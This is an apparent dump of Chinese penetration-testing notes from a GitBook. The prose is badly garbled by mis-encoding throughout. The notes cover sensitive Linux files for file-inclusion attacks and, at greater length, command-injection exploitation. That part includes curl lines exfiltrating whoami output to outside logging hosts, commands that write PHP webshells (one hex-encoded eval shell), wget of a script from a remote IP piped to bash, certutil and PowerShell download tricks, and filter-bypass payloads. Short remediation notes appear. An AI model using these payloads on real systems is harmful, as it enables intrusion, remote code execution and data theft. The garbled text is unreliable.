åœ¨å®‰å…¨æˆä¸ºä¸€ä¸ªå¤§é—®é¢˜ä¹‹å‰ï¼Œè¿™äº›æœåŠ¡ç»å¸¸ä¼šç”¨rootè´¦æˆ·ç™»å½•ã€‚é—æ†¾çš„æ˜¯ï¼Œå¦‚æœæœ‰éæˆæƒçš„ç”¨æˆ·æ”»é™·äº†è¿™äº›æœåŠ¡ä¸­çš„ä¸€ä¸ªï¼Œä»–ç«‹åˆ»å°±èƒ½ä½œä¸ºrootç”¨æˆ·è¿›å…¥ç³»ç»Ÿã€‚ä¸ºäº†é˜²æ­¢å‘ç”Ÿè¿™ç§æƒ…å†µï¼Œç°åœ¨è¿è¡Œåœ¨LinuxæœåŠ¡å™¨åå°çš„å‡ ä¹æ‰€æœ‰çš„æœåŠ¡éƒ½æ˜¯ç”¨è‡ªå·±çš„è´¦æˆ·ç™»å½•ã€‚è¿™æ ·çš„è¯ï¼Œå³ä½¿æœ‰äººæ”»å…¥äº†æŸä¸ªæœåŠ¡ï¼Œä¹Ÿæ— æ³•è®¿é—®æ•´ä¸ªç³»ç»Ÿã€‚ ä¸ºä»€ä¹ˆå¯†ç éƒ½æ˜¯X é‰´äºå¾ˆå¤šç¨‹åºéƒ½éœ€è¦è®¿é—®etc/passwdæ–‡ä»¶è·å–ç”¨æˆ·ä¿¡æ¯ï¼Œè¿™å°±æˆäº†ä¸€ä¸ªå®‰å…¨éšæ‚£ã€‚ ç»å¤§å¤šæ•°Linuxç³»ç»Ÿéƒ½å°†ç”¨æˆ·å¯†ç ä¿å­˜åœ¨å¦ä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶ä¸­ï¼ˆå«ä½œshadowæ–‡ä»¶ï¼Œä½ç½® åœ¨/etc/shadowï¼‰ã€‚åªæœ‰ç‰¹å®šçš„ç¨‹åºï¼ˆæ¯”å¦‚ç™»å½•ç¨‹åºï¼‰æ‰èƒ½è®¿é—®è¿™ä¸ªæ–‡ä»¶ /etc/shadow /etc/shadowæ–‡ä»¶å¯¹Linuxç³»ç»Ÿå¯†ç ç®¡ç†æä¾›äº†æ›´å¤šçš„æ§åˆ¶ã€‚åªæœ‰rootç”¨æˆ·æ‰èƒ½è®¿é—®/etc/shadow æ–‡ä»¶ï¼Œè¿™è®©å®ƒæ¯”èµ·/etc/passwdå®‰å…¨è®¸å¤šã€‚ /sys/class/net/eth0/address macåœ°å€ å†…ç½‘æ¢æµ‹ æ–‡ä»¶å†…å®¹è§£é‡Šhttps://blog.csdn.net/weichanghu_/article/details/80073959 /etc/hostsï¼šè®°å½•æœ¬æœºçš„æˆ–å…¶ä»–ä¸»æœºçš„ipåŠå…¶å¯¹åº”ä¸»æœºå /proc/net/arpï¼šè®°å½•ä¸»æœºipå’Œmacï¼Ÿï¼ˆarpåè®®ï¼‰ /proc/net/tcp /proc/net/udp /proc/net/dev /proc/net/fib_trie /proc/net/ ä½œç”¨ï¼šè¯¥ç›®å½•ä¸‹åŒ…å«äº†ä¸ç½‘ç»œç›¸å…³çš„ä¿¡æ¯ï¼Œå¸¸è§çš„æ–‡ä»¶æœ‰ï¼š /proc/net/devï¼šæ˜¾ç¤ºç½‘ç»œæ¥å£çš„ç»Ÿè®¡ä¿¡æ¯ï¼Œå¦‚æ¥æ”¶å’Œå‘é€çš„å­—èŠ‚æ•°ã€‚ /proc/net/tcpï¼šæ˜¾ç¤ºTCPè¿æ¥çš„çŠ¶æ€ã€‚ /proc/net/udpï¼šæ˜¾ç¤ºUDPè¿æ¥çš„çŠ¶æ€ã€‚ /proc/net/routeï¼šæ˜¾ç¤ºè·¯ç”±è¡¨ä¿¡æ¯ã€‚ /proc/mounts ä½œç”¨ï¼šæ˜¾ç¤ºå½“å‰ç³»ç»ŸæŒ‚è½½çš„æ–‡ä»¶ç³»ç»Ÿçš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬æŒ‚è½½ç‚¹ã€æ–‡ä»¶ç³»ç»Ÿç±»å‹å’ŒæŒ‚è½½é€‰é¡¹ç­‰ã€‚ /proc/hostname ä½œç”¨ï¼šæ˜¾ç¤ºç³»ç»Ÿçš„ä¸»æœºåã€‚ å‘½ä»¤å†å²æ“ä½œ Linux| ç”¨æˆ·ç›®å½•ä¸‹ä¸‰ä¸ªbashæ–‡ä»¶çš„ä½œç”¨(.bash_history,.bash_logout,.bash_profile,.bashrc)_YvesHeçš„åšå®¢-CSDNåšå®¢_bash_history /home/ç”¨æˆ·å/.bash_historyï¼š ä¿å­˜äº†å½“å‰ç”¨æˆ·ä½¿ç”¨è¿‡çš„å†å²å‘½ä»¤ å‘½ä»¤å†å²è®°å½•è¢«ä¿å­˜åœ¨éšè—æ–‡ä»¶.bash_historyä¸­ï¼Œå®ƒä½äºç”¨æˆ·çš„ä¸»ç›®å½•ä¸­ã€‚ è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œbashå‘½ä»¤çš„å†å²è®°å½•æ˜¯å…ˆå­˜æ”¾åœ¨å†…å­˜ä¸­ï¼Œå½“shellé€€å‡ºæ—¶æ‰è¢«å†™å…¥åˆ°å†å²æ–‡ä»¶ä¸­ã€‚ rootç”¨æˆ·å¯ä»¥é€šè¿‡historyå‘½ä»¤æŸ¥çœ‹ /procç›®å½• /proc æ˜¯ä¸€ç§ä¼ªæ–‡ä»¶ç³»ç»Ÿï¼ˆä¹Ÿå³è™šæ‹Ÿæ–‡ä»¶ç³»ç»Ÿï¼‰ï¼Œå­˜å‚¨çš„æ˜¯å½“å‰å†…æ ¸è¿è¡ŒçŠ¶æ€çš„ä¸€ç³»åˆ—ç‰¹æ®Šæ–‡ä»¶ï¼Œç”¨æˆ·å¯ä»¥é€šè¿‡è¿™äº›æ–‡ä»¶æŸ¥çœ‹æœ‰å…³ç³»ç»Ÿç¡¬ä»¶åŠå½“å‰æ­£åœ¨è¿è¡Œè¿›ç¨‹çš„ä¿¡æ¯ï¼Œç”šè‡³å¯ä»¥é€šè¿‡æ›´æ”¹å…¶ä¸­æŸäº›æ–‡ä»¶æ¥æ”¹å˜å†…æ ¸çš„è¿è¡ŒçŠ¶æ€ã€‚ /proc/self/cmdline # å¯åŠ¨å½“å‰è¿›ç¨‹æ—¶çš„å‘½ä»¤è¡Œå‚æ•° /proc/self/cwd # æŒ‡å‘å½“å‰è¿›ç¨‹çš„å·¥ä½œç›®å½• /proc/self/exe # æŒ‡å‘å½“å‰è¿›ç¨‹çš„å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ /proc/self/environ # å½“å‰è¿›ç¨‹çš„ç¯å¢ƒå˜é‡ /proc/self/mounts # æè¿°äº†ç³»ç»Ÿä¸­æ‰€æœ‰æŒ‚è½½çš„æ–‡ä»¶ç³»ç»Ÿ /proc/version # æ˜¾ç¤ºç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬ä¿¡æ¯ # çˆ†ç ´ /proc/pid/fd /proc/?/fd # ä½¿ç”¨é€šé…ç¬¦åŒ¹é… æ³¨æ„ç‚¹ åœ¨ linux ç³»ç»Ÿä¸­å¦‚æœä¸€ä¸ªç¨‹åºç”¨open()æ‰“å¼€äº†ä¸€ä¸ªæ–‡ä»¶ä½†æœ€ç»ˆæ²¡æœ‰å…³é—­ä»–ï¼Œå³ä¾¿ä»å¤–éƒ¨ï¼ˆå¦‚os.remove(SECRET_FILE)ï¼‰åˆ é™¤è¿™ä¸ªæ–‡ä»¶ä¹‹åï¼Œåœ¨ /proc è¿™ä¸ªè¿›ç¨‹çš„ pid ç›®å½•ä¸‹çš„ fd æ–‡ä»¶æè¿°ç¬¦ç›®å½•ä¸‹è¿˜æ˜¯ä¼šæœ‰è¿™ä¸ªæ–‡ä»¶çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œé€šè¿‡è¿™ä¸ªæ–‡ä»¶æè¿°ç¬¦æˆ‘ä»¬å³å¯å¾—åˆ°è¢«åˆ é™¤æ–‡ä»¶çš„å†…å®¹ã€‚ /proc/selfåœ¨ä½¿ç”¨æ—¶ï¼Œæˆ‘ä»¬æ˜¯ä¸èƒ½é€šè¿‡å‘½ä»¤çš„æ–¹å¼æ‰§è¡Œé€šè¿‡catå‘½ä»¤è¯»å–cmdlineçš„ï¼Œå› ä¸ºå¦‚æœæ˜¯catè¯»å–/proc/self/cmdlineçš„è¯ï¼Œå¾—åˆ°çš„æ˜¯catè¿›ç¨‹çš„ä¿¡æ¯ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡é¢˜ç›®çš„å½“å‰è¿›ç¨‹ä½¿ç”¨è¯»å–æ–‡ä»¶ï¼ˆå¦‚æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæˆ–è€…SSTIä½¿ç”¨fileæ¨¡å—è¯»å–æ–‡ä»¶ï¼‰çš„æ–¹å¼è¯»å–/proc/self/cmdlineã€‚ æ¼æ´ä¿®å¤ åœ¨é…ç½®æ–‡ä»¶ä¸­é™åˆ¶è®¿é—®çš„æ–‡ä»¶ç›®å½• æ£€æŸ¥ç”¨æˆ·è¾“å…¥ï¼Œè¿‡æ»¤æˆ–è½¬ä¹‰å«æœ‰../ã€..\\ã€%00ï¼Œ..ï¼Œ./ï¼Œ#ç­‰è·³è½¬ç›®å½•æˆ–å­—ç¬¦ç»ˆæ­¢ç¬¦ã€æˆªæ–­å­—ç¬¦çš„è¾“å…¥ ä¸¥æ ¼è¿‡æ»¤ç”¨æˆ·è¾“å…¥å­—ç¬¦çš„åˆæ³•æ€§ï¼Œæ¯”å¦‚æ–‡ä»¶ç±»å‹ã€æ–‡ä»¶åœ°å€ã€æ–‡ä»¶å†…å®¹ç­‰ ç™½åå•é™å®šè®¿é—®æ–‡ä»¶çš„ç›®å½•ã€è·¯å¾„ã€åç§° ç™½åå•é™å®šè®¿é—®æ–‡ä»¶çš„åç¼€å¦‚jpgã€gifã€pngã€rarã€zipã€pdfã€docã€xlsã€pptç­‰ OSSå­˜å‚¨ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-21 15:09:58 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/02.æ–‡ä»¶æ“ä½œ/æ–‡ä»¶é¢„è§ˆ.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/02.æ–‡ä»¶æ“ä½œ/æ–‡ä»¶é¢„è§ˆ.html","title":"æ–‡ä»¶é¢„è§ˆ","keywords":"","body":"PDF https://xz.aliyun.com/t/10025?time__1311=Cqjx2DRiD%3DMDlxGgOKGOiDC8GCDcimPOioD https://zone.huoxian.cn/d/550-pdfhtmlxss-ssrf/4 Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-21 15:20:23 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/03.å‘½ä»¤æ³¨å…¥/01.æ¼æ´äº†è§£.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/03.å‘½ä»¤æ³¨å…¥/01.æ¼æ´äº†è§£.html","title":"01.æ¼æ´äº†è§£","keywords":"","body":"æ¼æ´åŸç† å‘½ä»¤æ³¨å…¥ï¼ˆCommand Injectionï¼‰æ¼æ´æ˜¯æŒ‡æ”»å‡»è€…é€šè¿‡æ³¨å…¥æ¶æ„å‘½ä»¤æ¥æ‰§è¡Œéé¢„æœŸçš„æ“ä½œï¼›ç®€å•æ¥è¯´å°±æ˜¯æ²¡æœ‰å¯¹ç”¨æˆ·è¾“å…¥çš„å†…å®¹å……åˆ†çš„éªŒè¯æˆ–è¿‡æ»¤ï¼Œè€Œç›´æ¥å¸¦å…¥åˆ°å‘½ä»¤æ‰§è¡Œå‡½æ•°ä¸­å½“æˆç³»ç»Ÿå‘½ä»¤è¢«æ‰§è¡Œã€‚ æ¼æ´å±å®³ æ‰§è¡Œä»»æ„ç³»ç»Ÿå‘½ä»¤ï¼Œå¯èƒ½å¯¼è‡´ç³»ç»Ÿè¢«å®Œå…¨æ§åˆ¶ã€‚ æ•æ„Ÿä¿¡æ¯æ³„éœ²ï¼Œå¦‚å¯†ç ã€æ•°æ®åº“å†…å®¹ç­‰ã€‚ å¯¹ç³»ç»Ÿè¿›è¡Œæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚ æ‰§è¡Œæ¶æ„ä»£ç ï¼Œå¦‚å®‰è£…åé—¨ã€æ¤å…¥æ¶æ„è½¯ä»¶ç­‰ã€‚ å¸¸è§åœºæ™¯ ç®¡ç†ç•Œé¢çš„é…ç½®ä¸»æœºå/IP/æ©ç /ç½‘å…³ã€æŸ¥çœ‹ç³»ç»Ÿä¿¡æ¯ç­‰åŠŸèƒ½å¤„ å…³é—­ã€é‡å¯ç­‰åŠŸèƒ½å¤„ pingã€nslookupç­‰éªŒè¯ä¸»æœºç­‰åŠŸèƒ½å¤„ æä¾›å‘é€é‚®ä»¶ã€è½¬æ¢å›¾ç‰‡ç­‰åŠŸèƒ½å¤„ ç§é’¥ç”Ÿæˆ é€šè¿‡æ•°æ®åº“æ‰§è¡Œ POC # Win || curl %USERNAME%.8f208c4a.ipv6.1433.eu.org # Linux || curl `whoami`.8f208c4a.ipv6.1433.eu.org æ¼æ´ä¿®å¤ è¾“å…¥éªŒè¯å’Œè¿‡æ»¤ï¼šå¯¹äºä»ç”¨æˆ·æˆ–å¤–éƒ¨æºæ¥æ”¶çš„æ‰€æœ‰è¾“å…¥æ•°æ®ï¼Œè¿›è¡Œä¸¥æ ¼çš„éªŒè¯å’Œè¿‡æ»¤ã€‚ç¡®ä¿åªå…è®¸é¢„æœŸçš„è¾“å…¥å­—ç¬¦å’Œæ ¼å¼ï¼Œå¹¶æ‹’ç»æ½œåœ¨çš„æ¶æ„ä»£ç ã€‚ æƒé™é™åˆ¶ï¼šç¡®ä¿åº”ç”¨ç¨‹åºåœ¨æ‰§è¡Œå‘½ä»¤æ—¶ä½¿ç”¨æœ€ä½ç‰¹æƒã€‚ä¸è¦åœ¨å‘½ä»¤æ‰§è¡Œä¸­ä½¿ç”¨è¶…çº§ç”¨æˆ·æƒé™æˆ–ç®¡ç†å‘˜æƒé™ï¼Œä»¥é™ä½æ”»å‡»è€…å¯èƒ½è·å¾—çš„æƒé™ã€‚ æ²™ç®±ç¯å¢ƒï¼šåœ¨å¯èƒ½çš„æƒ…å†µä¸‹ï¼Œå°†åº”ç”¨ç¨‹åºæˆ–ç›¸å…³ç»„ä»¶è¿è¡Œåœ¨æ²™ç®±ç¯å¢ƒä¸­ï¼Œä»¥é™åˆ¶å…¶å¯¹ç³»ç»Ÿçš„è®¿é—®æƒé™ã€‚è¿™å¯ä»¥å¸®åŠ©éš”ç¦»æ¶æ„ä»£ç çš„å½±å“ï¼Œå¹¶æä¾›é¢å¤–çš„å®‰å…¨å±‚ã€‚ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-18 22:33:09 "},"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/03.å‘½ä»¤æ³¨å…¥/02.æ¼æ´åˆ©ç”¨.html":{"url":"01.æ¸—é€æµ‹è¯•/02.Webå®‰å…¨/03.å‘½ä»¤æ³¨å…¥/02.æ¼æ´åˆ©ç”¨.html","title":"02.æ¼æ´åˆ©ç”¨","keywords":"","body":"å‘½ä»¤ç»“æœæ— å›æ˜¾ ç»“æœé‡å®šå‘ å°†æ–‡ä»¶ç§»åŠ¨åˆ°å¯è®¿é—®ç›®å½•ï¼ˆç½‘ç«™ç›®å½•ï¼Œé™æ€ æ–‡ä»¶ç›®å½•ï¼‰ å¤–å¸¦ HTTPåè®® ```shell Linux curl http/cmd # Windows for /F %X in ('whoami') do start http://fgtb.eyes.sh/%X # ç”¨whoamiæ—¶å› ä¸ºæœ‰/ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨dnslogï¼Œåªèƒ½ç”¨weblog for /F %X in ('cd') do start http://fgtb.eyes.sh/%X cmd /v /c \"whoami > temp && certutil -encode temp temp2 && findstr /L /V \"CERTIFICATE\" temp2 > temp3 && set /p MYVAR= DNSåè®® å„ç§ç¯å¢ƒDNSå¤–å¸¦å›æ˜¾å‘½ä»¤ | CN-SEC ä¸­æ–‡ç½‘ https://github.com/A0WaQ4/HexDnsEchoT ä¸å‡ºç½‘å†™Webshell å†™webshell # Linux echo '' > 1.php echo \"\" > 1.php # åŒå¼•å·åŒ…è£¹éœ€è¦è½¬ä¹‰ # Win echo ^ > 1.php # ä½¿ç”¨^æ¥è½¬ä¹‰ é€šè¿‡é™æ€æ–‡ä»¶å®šä½webç›®å½•å¹¶è‡ªåŠ¨å†™å…¥æ–‡ä»¶ # Linux find / -name \"1.txt\" -execdir bash -c 'echo \"\" > phpinfo.php' \\; # Win for /f %i in ('dir /s /b note.txt') do (echo %i>path.txt)&(ipconfig > ipconfig.txt)&(systeminfo >systeminfo.txt)&(tasklist > tasklist.txt) for /f %i in ('dir /s /b note.txt') do (echo ^ > phpinfo.php) # ä¸è¡Œ powershell -command \"Get-ChildItem -Path './' -Recurse -Filter 'note.txt' | ForEach-Object { New-Item -Path $_.DirectoryName -Name 'phpinfo.php' -ItemType 'file' -Value '' }\" # å½“æ–‡ä»¶å­˜åœ¨æ—¶å†™å…¥ä¼šå¤±è´¥ï¼Œéœ€è¦ä¿®æ”¹æ–‡ä»¶å æ–‡ä»¶å†™å…¥åˆ†å—ä¼ è¾“ Linux echo -e -n \\\" /var/www/html/1.txt echo -e -n \\\"eval\\\" > /var/www/html/2.txt echo -e -n '($_POST[\\\"pass' > /var/www/html/3.txt echo -e -n '\\\"])' > /var/www/html/4.txt echo -e -n \\\" ?>\\\" > /var/www/html/5.txt cat /var/www/html/1.txt /var/www/html/2.txt /var/www/html/3.txt /var/www/html/4.txt /var/www/html/5.txt> /var/www/html/xxx.php pythonåˆ†å—ä¼ è¾“ import requests import base64 def encode_file_to_base64(file_path, output_path): \"\"\"å°†æ–‡ä»¶å†…å®¹è½¬åŒ–ä¸ºBase64å­—ç¬¦ä¸²å¹¶ä¿å­˜åˆ°æ–°æ–‡ä»¶ä¸­ã€‚\"\"\" with open(file_path, 'rb') as file: file_content = file.read() base64_encoded = base64.b64encode(file_content).decode('utf-8') with open(output_path, 'w', encoding='utf-8') as output_file: output_file.write(base64_encoded) def read_text_from_file(file_path): \"\"\"ä»æ–‡ä»¶ä¸­è¯»å–Base64å­—ç¬¦ä¸²å†…å®¹ã€‚\"\"\" with open(file_path, 'r', encoding='utf-8') as file: text = file.read() return text def split_text(text, chunk_size=100): \"\"\"å°†æ–‡æœ¬æŒ‰æ¯chunk_sizeä¸ªå­—ç¬¦åˆ†å‰²ã€‚\"\"\" return [text[i:i + chunk_size] for i in range(0, len(text), chunk_size)] def send_post_requests(url, text_chunks): \"\"\"éå†æ¯ä¸ªåˆ†å‰²åçš„æ–‡æœ¬å¹¶å‘é€POSTè¯·æ±‚ã€‚\"\"\" responses = [] for chunk in text_chunks: response = requests.post(url, data={'body': chunk}) responses.append(response) return responses # ç¤ºä¾‹ç”¨æ³• original_file_path = \"path/to/your/file\" # è¦ç¼–ç çš„æ–‡ä»¶è·¯å¾„ base64_file_path = \"path/to/your/base64_output.txt\" # å­˜å‚¨Base64ç¼–ç çš„æ–‡ä»¶è·¯å¾„ url = \"http://your_api_endpoint_here\" # 1. å°†æ–‡ä»¶å†…å®¹è½¬æ¢ä¸ºBase64å¹¶ä¿å­˜åˆ°æ–°æ–‡ä»¶ä¸­ encode_file_to_base64(original_file_path, base64_file_path) # 2. ä»Base64æ–‡ä»¶ä¸­è¯»å–å†…å®¹ base64_text = read_text_from_file(base64_file_path) # 3. åˆ†å‰²Base64å­—ç¬¦ä¸² text_chunks = split_text(base64_text, chunk_size=100) # 4. å‘é€POSTè¯·æ±‚ responses = send_post_requests(url, text_chunks) # è¾“å‡ºæ¯ä¸ªå“åº”çŠ¶æ€ç  for i, response in enumerate(responses): print(f\"è¯·æ±‚ {i+1} çŠ¶æ€ç : {response.status_code}\") base64è§£ç  base64 -d /tmp/tmp.txt > /tmp/payload åå¼¹shell https://forum.ywhack.com/shell.php è¿œç¨‹æ–‡ä»¶ä¸‹è½½ è¿œç¨‹æ–‡ä»¶ä¸‹è½½ è¿œç¨‹ä¸‹è½½shå¹¶æ‰§è¡Œ wget http://104.243.25.78:8888/1.sh chmod 777 1.sh || chmod +x 1.sh bash 1.sh win bitsadmin /transfer n 'ä¸‹è½½åœ°å€' 'ä¿å­˜åœ°å€' powershell (new-object System.Net.WebClient).DownloadFile('ä¸‹è½½åœ°å€','ä¿å­˜åœ°å€') ä¸‹è½½æ–‡ä»¶: certutil -urlcache -split -f 'ä¸‹è½½åœ°å€' 'ä¿å­˜åœ°å€' åˆ é™¤ç¼“å­˜: certutil -urlcache -split -f 'ä¸‹è½½åœ°å€' delete # ç»•è¿‡æ‰‹æ®µä¹‹åŒå†™certutil certutil & certutil ..... # ç»•è¿‡æ‰‹æ®µä¹‹åˆ†å—ä¼ è¾“ CertUtil -encode fscan.exe fscan_base64.txt # ç¼–ç  cmd=powershell -c \"'Â§Â§' | Out-File C:\\fscan_base64.txt -Append\" #PowerShellè¿½åŠ å†™å…¥ certutil -decode fscan_base64.txt fscan.exe # certutilè¿˜åŸæ–‡ä»¶ Windows&Linuxæ–‡ä»¶ä¼ è¾“æ–¹å¼æ€»ç»“ - yokan - åšå®¢å›­ (cnblogs.com) https://lolbas-project.github.io/ ç±»ä¼¼äºgtfobins Bypass Linux å¤šæ¡å‘½ä»¤æ‰§è¡Œ è¿æ¥ç¬¦ åŠŸèƒ½ \\ ç®¡é“ï¼Œå‰ä¸€ä¸ªå‘½ä»¤çš„è¾“å‡ºä½œä¸ºåä¸€ä¸ªå‘½ä»¤çš„è¾“å…¥ ï¼› ä¾æ¬¡æ‰§è¡Œå‘½ä»¤ \\ \\ å¦‚æœå‰ä¸€æ¡å‘½ä»¤æ‰§è¡Œä¸æˆåŠŸåˆ™æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤ & å³ä½¿å‰ä¸€æ¡å‘½ä»¤æ‰§è¡Œä¸æˆåŠŸä¹Ÿä¼šæ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤ && å¦‚æœå‰ä¸€æ¡å‘½ä»¤æ‰§è¡ŒæˆåŠŸåˆ™æ‰§è¡Œä¸‹ä¸€æ¡å‘½ä»¤ %0a / %0d%0a æ¢è¡Œæ‰§è¡Œå‘½ä»¤ `` å†…æ•›æ‰§è¡Œ $() å†…æ•›æ‰§è¡Œ . Linux ä¸­ï¼Œ.ä¹Ÿå«periodï¼Œå®ƒçš„ä½œç”¨å’Œsourceä¸€æ ·ï¼Œå°±æ˜¯ç”¨å½“å‰çš„ shell æ‰§è¡Œä¸€ä¸ªæ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚æ¯”å¦‚ï¼Œå½“å‰è¿è¡Œçš„ shell æ˜¯ bashï¼Œåˆ™ . filenameçš„æ„æ€å°±æ˜¯ç”¨ bash æ‰§è¡Œ filename æ–‡ä»¶ä¸­çš„å‘½ä»¤ã€‚ ç¼–ç ç»•è¿‡ base64 echo 'base64(payload)' | base64 -d | bash è¿›åˆ¶ç»•è¿‡ shellè§£æå…«è¿›åˆ¶ï¼Œls â†’ $'\\154'$'\\163' khaz@DESKTOP-JCNAFF7:~$ $'\\154'$'\\163' 1 jdk-8u333-linux-x64.tar.gz:Zone.Identifier result.txt ysoserial.jar:Zone.Identifier jdk-8u333-linux-x64.tar.gz jdk8 # phpä¼ å‚æ—¶çš„æ ¼å¼ $(printf \"\\154\\163\") $(echo \"\\154\\163\") è¿›åˆ¶è½¬æ¢ â”Œâ”€â”€(khazã‰¿kali)-[~/æ¡Œé¢] â””â”€$ echo $((2#111)) 7 phpç»•è¿‡ phpèŠ±æ ·å°±å¤šäº†ğŸ˜‹ php -r 'system(chr(108).chr(115))' ç»•è¿‡å…³é”®å­—è¿‡æ»¤ æ’å…¥\\ cat = ca\\t = c\\at = \\cat æ’å…¥ç©ºå­—ç¬¦ ls = l''s = l\"\"s = l's' = l\"s\" ï¼ˆåªè¦æ’å…¥æˆå¯¹çš„å•åŒå¼•å·å°±å¯ä»¥ï¼‰ = l$1s = l${asdfa}s = l``s = l$(``)s = l$('')s = l$(\"\")s $1~$9ä¸ºè„šæœ¬å‚æ•° ${xx}ä»£è¡¨å˜é‡å€¼,åªè¦xxæ²¡æœ‰å®šä¹‰å³å¯ å†…æ•›æ‰§è¡Œç©ºå‘½ä»¤ å˜é‡æ‹¼æ¥ a=c;b=at;$a$b file å¦‚æœï¼›è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨%0aæˆ–è€…&&ï¼ˆéœ€è¦urlç¼–ç ï¼‰ä»£æ›¿ å…¶ä»–å‘½ä»¤ä»£æ›¿ æ–‡ä»¶åç”¨é€šé…ç¬¦ è¾“å‡ºé‡å®šå‘ç¬¦ç»•è¿‡ é‡å®šå‘ç¬¦å†™å…¥æ–‡ä»¶çš„æœ¬è´¨æ˜¯å°†æ ‡å‡†è¾“å…¥è¾“å‡ºåˆ°æ–‡ä»¶ä¸­ echo 3c3f70687020406576616c28245f504f53545b277479736563275d293b3f3e|xxd -ps -r|tee shell.php xxdï¼šç”¨äºå°†åå…­è¿›åˆ¶ç¼–ç çš„æ•°æ®è½¬æ¢å›åŸå§‹çš„äºŒè¿›åˆ¶æ•°æ® -psï¼šæŒ‡å®šè¾“å‡ºæ ¼å¼ä¸ºçº¯ç²¹çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ã€‚ -rï¼šè¡¨ç¤ºè¿›è¡Œåå‘æ“ä½œï¼Œå³å°†åå…­è¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºäºŒè¿›åˆ¶æ•°æ®ã€‚ teeï¼šåŒæ—¶å°†è¯»å–çš„æ ‡å‡†è¾“å…¥å†…å®¹è¾“å‡ºåˆ°æ ‡å‡†è¾“å‡ºå’ŒæŒ‡å®šçš„æ–‡ä»¶ä¸­ã€‚ é¡ºç€è¿™ä¸ªæ€è·¯ command | dd of=file.txt command | cp /dev/stdin file.txt ç©ºæ ¼ç»•è¿‡ ${IFS} $IFS+ç©ºå­—ç¬¦ é‡å®šå‘ç¬¦ {cat,flag.php} urlå‚æ•°ç¼–ç ï¼Œç©ºæ ¼%20ï¼Œåˆ¶è¡¨ç¬¦%09 ç›®å½•åˆ†éš”ç¬¦/ç»•è¿‡ å¤šæ¡å‘½ä»¤æ‰§è¡Œï¼Œå…ˆcdåˆ°ç›®çš„ç›®å½•ï¼Œå†æ‰§è¡Œcatç­‰å‘½ä»¤ cd ..;cd ..;cd ..;cat flag å¦‚æœï¼›è¢«è¿‡æ»¤ï¼Œå¯ä»¥ç”¨%0aæˆ–è€…&&ï¼ˆéœ€è¦urlç¼–ç ï¼‰ä»£æ›¿ æˆªå–ç¯å¢ƒå˜é‡ envæˆ–è€…printenvï¼šæ‰“å°ç¯å¢ƒå˜é‡ khaz@DESKTOP-JCNAFF7:~$ echo ${PWD:0:1} / å†…æ•›æ‰§è¡Œç»•è¿‡ cat `ls` cat $(ls) >>è¯»å–å½“å‰ç›®å½•çš„æ‰€æœ‰æ–‡ä»¶ å°†lsçš„è¾“å‡ºä½œä¸ºcatçš„è¾“å…¥è¿›è¡Œæ‰§è¡Œã€‚ é•¿åº¦é™åˆ¶ç»•è¿‡ çŸ¥è¯†ç‚¹ lsè¾“å‡ºçš„ç»“æœæ˜¯æŒ‰ç…§å­—å…¸æ’åºçš„ \\æ”¾åœ¨æŒ‡ä»¤çš„æœ€æœ«ç«¯ï¼Œè¡¨ç¤ºæŒ‡ä»¤è¿æ¥ä¸‹ä¸€è¡Œã€‚ khaz@DESKTOP-JCNAFF7:~$ cat \\ > 1 da ls -t > aå°†æ–‡ä»¶åï¼ˆå‘½ä»¤ï¼‰æŒ‰æ—¶é—´é‡å®šå‘åˆ°è„šæœ¬æ–‡ä»¶aä¸­ï¼Œsh aæ‰§è¡Œè„šæœ¬aã€‚ æ³¨ï¼šå°†æ‰§è¡Œçš„å‘½ä»¤ååºç”Ÿæˆã€‚\\\\æ˜¯ä¸ºäº†è½¬ä¹‰ï¼Œè®©æ–‡ä»¶åå¸¦ä¸Š\\ å•ç‹¬ä¸€ä¸ª*ä¼šå°†ç›®å½•ä¸‹çš„æ–‡ä»¶åæŒ‰ç…§å­—å…¸æ’åºæ‹¼æ¥æˆå‘½ä»¤æ‰§è¡Œï¼Œç¬¬ä¸€ä¸ªæ–‡ä»¶åä¸ºå‘½ä»¤ï¼Œå…¶ä»–ä¸ºè¯¥å‘½ä»¤çš„å‚æ•° echo hello åœ¨è¿™ä¸ªåŸºç¡€ä¸Š*oä¹Ÿå¯ä»¥ï¼Œå°±æ˜¯å–å‡ºæ»¡è¶³æ­£åˆ™*oçš„æ–‡ä»¶åæ‹¼æ¥æˆå‘½ä»¤æ‰§è¡Œã€‚ [UUCTF 2022 æ–°ç”Ÿèµ›]ezrce ç»™å‡ºäº†ä¸€ä¸ªå‘½ä»¤æ‰§è¡Œæ¥å£ï¼Œæµ‹è¯•ä¹‹åå‘ç°é•¿åº¦é™åˆ¶ä¸º6,æ­£å¸¸æ€è·¯ >a echo 1 ç„¶åå°è¯•è®¿é—®/tmp/aï¼ŒæœåŠ¡å™¨æ²¡æœ‰æŠ¥é”™ï¼Œè¯´æ˜>aå…¶å®æ˜¯æ‰§è¡ŒæˆåŠŸäº†çš„ã€‚ è§£æ³•1 >cp * /* . 